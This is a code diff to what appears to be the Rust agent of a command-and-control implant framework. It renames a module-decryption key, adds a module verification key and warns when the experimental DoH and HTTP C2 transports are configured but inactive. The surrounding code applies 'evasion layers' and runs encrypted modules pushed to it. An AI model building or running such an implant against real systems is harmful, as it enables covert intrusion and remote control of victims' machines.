@@ -40,7 +40,7 @@ pub struct Agent {
     transport: Arc<Mutex<Box<dyn Transport + Send>>>,
     config: Arc<Mutex<Config>>,
     /// AES-256-GCM session used to decrypt capability modules deployed at
-    /// runtime. Derived from the `module_signing_key` in `agent.toml`, or
+    /// runtime. Derived from the `module_aes_key` in `agent.toml`, or
     /// a zero key when not configured (development only).
     crypto: Arc<CryptoSession>,
 }
@@ -57,13 +57,13 @@ impl Agent {
 
         // Derive the module-decryption key from configuration.
         // In production this key must be set in agent.toml.
-        let crypto_key: [u8; 32] = if let Some(ref b64) = cfg.module_signing_key {
+        let crypto_key: [u8; 32] = if let Some(ref b64) = cfg.module_aes_key {
             use base64::Engine;
             let bytes = base64::engine::general_purpose::STANDARD
                 .decode(b64)
                 .map_err(|e| {
                     anyhow::anyhow!(
-                        "module_signing_key in agent.toml is not valid base64: {}. \
+                        "module_aes_key in agent.toml is not valid base64: {}. \
                      Provide a valid 32-byte base64-encoded key or remove the field \
                      to disable module signature verification.",
                         e
@@ -71,7 +71,7 @@ impl Agent {
                 })?;
             if bytes.len() != 32 {
                 return Err(anyhow::anyhow!(
-                    "module_signing_key must decode to exactly 32 bytes, got {} byte(s). \
+                    "module_aes_key must decode to exactly 32 bytes, got {} byte(s). \
                      Re-generate the key with the `keygen` tool.",
                     bytes.len()
                 ));
@@ -81,29 +81,31 @@ impl Agent {
             key
         } else {
             // In release builds (no debug_assertions, not dev/test feature) a
-            // missing module_signing_key is a hard error: an all-zero key lets
+            // missing module_aes_key is a hard error: an all-zero key lets
             // anyone push arbitrary modules.  Development builds accept the
             // insecure default so the build cycle stays fast.
             #[cfg(not(any(debug_assertions, feature = "dev", test)))]
             return Err(anyhow::anyhow!(
-                "module_signing_key is required in production builds. \
+                "module_aes_key is required in production builds. \
                  Generate a 32-byte key with `keygen`, base64-encode it, \
-                 and set it in agent.toml under [module_signing_key]."
+                 and set it in agent.toml under [module_aes_key]."
             ));
 
             #[cfg(any(debug_assertions, feature = "dev", test))]
             log::warn!(
-                "WARNING: module_signing_key not set — using insecure all-zero key. \
+                "WARNING: module_aes_key not set — using insecure all-zero key. \
                  Do not use in production!"
             );
 
             [0u8; 32] // insecure default; acceptable only for development builds
         };
 
+        let crypto = Arc::new(CryptoSession::from_key(crypto_key));
+        crate::memory_guard::register_session_key(&crypto);
         Ok(Self {
             transport: Arc::new(Mutex::new(transport)),
             config: Arc::new(Mutex::new(cfg)),
-            crypto: Arc::new(CryptoSession::from_key(crypto_key)),
+            crypto,
         })
     }
 
@@ -202,7 +204,26 @@ impl Agent {
             log::debug!("Evasion layers applied");
         }
 
-        // Optimize hot functions at startup
+        // Warn when experimental transports are configured but still inactive.
+        {
+            let cfg = self.config.lock().await;
+            if cfg.malleable_profile.dns_over_https {
+                log::warn!(
+                    "dns_over_https is set in config but the DoH transport (c2_doh) is \
+                     EXPERIMENTAL and not active in this build. Traffic still uses the \
+                     default TLS transport."
+                );
+            }
+            if cfg.malleable_profile.cdn_relay {
+                log::warn!(
+                    "cdn_relay is set in config but the HTTP malleable transport (c2_http) is \
+                     EXPERIMENTAL and not active in this build. Traffic still uses the \
+                     default TLS transport."
+                );
+            }
+        }
+
+        // Optimise hot functions at startup
         #[cfg(feature = "unsafe-runtime-rewrite")]
         if let Err(e) = optimizer::optimize_hot_function("crypto_session_encrypt") {
             tracing::warn!("Runtime optimization failed: {}", e);
@@ -287,9 +308,10 @@ impl Agent {
                     let transport = self.transport.clone();
                     let name_clone = module_name.clone();
                     let ver_clone = version.clone();
+                    let verify_key = self.config.lock().await.module_verify_key.clone();
                     tasks.spawn(async move {
                         let result =
-                            handlers::push_module(name_clone.clone(), &encrypted_blob, &crypto);
+                            handlers::push_module(name_clone.clone(), &encrypted_blob, &crypto, verify_key.as_deref());
                         let (outcome, details) = match &result {
                             Ok(s) => {
                                 info!("ModulePush '{}': {}", name_clone, s);
@@ -313,13 +335,13 @@ impl Agent {
                 Err(e) => {
                     error!("Transport error: {}", e);
                     // Drain tasks before returning error
-                    while let Some(_) = tasks.join_next().await {}
+                    while tasks.join_next().await.is_some() {}
                     return Err(e);
                 }
             }
         }
 
-        while let Some(_) = tasks.join_next().await {}
+        while tasks.join_next().await.is_some() {}
         Ok(())
     }
 }
